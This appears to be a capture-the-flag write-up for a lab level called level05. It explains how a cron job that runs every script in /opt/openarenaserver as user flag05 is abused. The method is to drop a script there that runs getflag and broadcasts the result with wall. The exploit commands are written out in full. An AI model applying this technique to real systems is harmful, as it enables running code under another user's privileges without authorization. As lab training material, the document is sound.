## level05

There is nothing in the home folder. Luckily, during the exploration of the VM during the first exercise, we found the folder `/var/mail` which contains what looks like a cron job for user `flag05`: `*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`.

```shell
#!/bin/sh
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```
This script finds all the files found in `/opt/openarenaserver/*`, executes them, and removes them.

We will craft a script to exploit this vulnerability.
Our aim is for the cron job to run the getflag command and then broadcast the output to all users' terminals, meaning our terminal, using the wall command.

```shell
echo '#!/bin/sh' > /opt/openarenaserver/exploit.sh
echo 'getflag | wall' >> /opt/openarenaserver/exploit.sh
chmod +x /opt/openarenaserver/exploit.sh
```